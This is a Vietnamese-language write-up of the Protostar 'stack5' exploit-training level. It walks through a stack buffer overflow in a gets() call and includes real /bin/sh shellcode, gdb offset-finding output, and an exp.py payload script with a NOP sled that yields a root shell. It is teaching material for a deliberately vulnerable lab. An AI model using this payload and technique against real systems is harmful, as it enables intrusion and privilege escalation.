# STACK FIVE

## About

Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

  * At this point in time, it might be easier to use someone elses shellcode
  
  * If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
  
  * remove the int3s once your shellcode is done.

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Solutions

`STACK FIVE` là thử thách không có hàm win(), đọc giới thiệu ta có thể thấy thử thách muốn chúng ta tìm hiểu về Shellcode và học cách khai thác ret2shellcode.

Shellcode là gì ?

```
Shellcode còn được gọi là bytecode, tạm dịch là mã máy. Chúng ta đều biết mã máy là thứ ngôn ngữ duy nhất mà bộ vi xử lí có thể hiểu được. Tất cả các chương trình viết bằng bất kì ngôn ngữ nào đều phải được biên dịch sang mã máy trước khi máy tính có thể chạy được chương trình đó. Khác với các chương trình này, shellcode được thể hiện như một nhóm các mã máy, do đó máy tính có thể hiểu và thực thi trực tiếp shellcode mà không cần phải trải qua bất kì công đoạn biên dịch nào cả.
```

Với người mới tìm hiểu và chưa có kiến thức nhiều về mã máy, thử thách gợi ý sẽ tốt hơn khi tại thời điểm này sử dụng `shellcode` của ai đó.

Tôi lấy nguồn từ trên mạng: <https://www.exploit-db.com/exploits/43716>

```
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

Tiếp theo là tìm độ dài chuỗi có thể ghi đè eip.

```
root@protostar:/opt/protostar/bin# python -c 'print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4 + "G" * 4 + "H" * 4' > txt
root@protostar:/opt/protostar/bin# gdb -q ./stack5
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) r < txt
Starting program: /opt/protostar/bin/stack5 < txt

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()       <-- EEEE Tiếp tục là 76
(gdb)
```
Vậy payload của chúng ta bây giờ sẽ trông như này:

`payload = "A" * 76 + return address + "\x90" * 100 + shellcode`

Các bạn nên đọc link tài liệu ở phần Documents để hiểu rõ hơn về `shellcode` và `"\x90" NOPs`.

Stack sẽ trông như sau khi bị ghi đè (Bố cục địa chỉ có thể khác trên máy bạn):

```
(gdb) x/100wx $esp
0xbffffc10:     0xbffffc20      0xb7ec6165      0xbffffc28      0xb7eada75
0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141      <-- padding bắt đầu từ 0x41414141.
0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc40:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc50:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc60:     0x41414141      0x41414141      0x41414141      0xxxxxxxxx       <-- Vị trí của Return address | Ở đây được tính toán = 0xbffffc6c + 0x50 = 0xbffffcbc để trả về vào giữa dãy NOPs
0xbffffc70:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc80:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc90:     0x90909090      0x90909090      0x90909090      0x90909090      <-- sau ret sẽ là chuỗi '\x90' vì sẽ có sự biến động khi chạy và debug, nên sẽ không thể tính chính xác vị trí của shellcode mà phải ước lượng và trượt vào nó qua NOPs để đến shell.
0xbffffca0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffcb0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffcc0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffcd0:     0x90909090      0x50c031cc      0x732f2f68      0x622f6868        <-- Shellcode start: 0xbffffcd4, sau chuỗi NOPs sẽ là shellcode do hệ thống sẽ bỏ qua NOPs và tiếp tục thực thi.
0xbffffce0:     0xe3896e69      0xc289c189      0x80cd0bb0      0xcd40c031
0xbffffcf0:     0x08040080      0x00000001      0xbffffd14      0x080483f0
0xbffffd00:     0x080483e0      0xb7ff1040      0xbffffd0c      0xb7fff8f8
0xbffffd10:     0x00000001      0xbffffe20      0x00000000      0xbffffe3a
0xbffffd20:     0xbffffe4a      0xbffffe5e      0xbffffe80      0xbffffe93
0xbffffd30:     0xbffffe9d      0xbffffea9      0xbffffeeb      0xbffffeff
0xbffffd40:     0xbfffff0e      0xbfffff25      0xbfffff36      0xbfffff3f
0xbffffd50:     0xbfffff8c      0xbfffff97      0xbfffff9f      0xbfffffac
0xbffffd60:     0x00000000      0x00000020      0xb7fe2414      0x00000021
0xbffffd70:     0xb7fe2000      0x00000010      0x0f8bfbff      0x00000006
0xbffffd80:     0x00001000      0x00000011      0x00000064      0x00000003
0xbffffd90:     0x08048034      0x00000004      0x00000020      0x00000005
```
Kết quả dừng trước int3 '\xcc' -> bỏ int3 thì shellcode được thực thi.

```
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffffcd5 in ?? ()
(gdb)
```
Từ bài này chúng ta sẽ bắt đầu viết file payload exp.py 

File exp.py

``` 
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = "A" * 76 + "\xbc\xfc\xff\xbf" + "\x90" * 100 + shellcode
print payload
```

Bước khai thác cuối cùng

```exp.py
root@protostar:/opt/protostar/bin$ $(python exp.py ; cat) | ./stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami 
root
ls
final0	final2	 format1  format3  heap0  heap2  net0  net2  net4    stack1  stack3  stack5  stack7
final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6
```

## Documents

<https://vnhacker.blogspot.com/2006/12/shellcode-thn-chng-nhp-mn.html>

<https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/>

<https://www.coengoedegebure.com/buffer-overflow-attacks-explained/>

<https://en.wikipedia.org/wiki/Endianness>


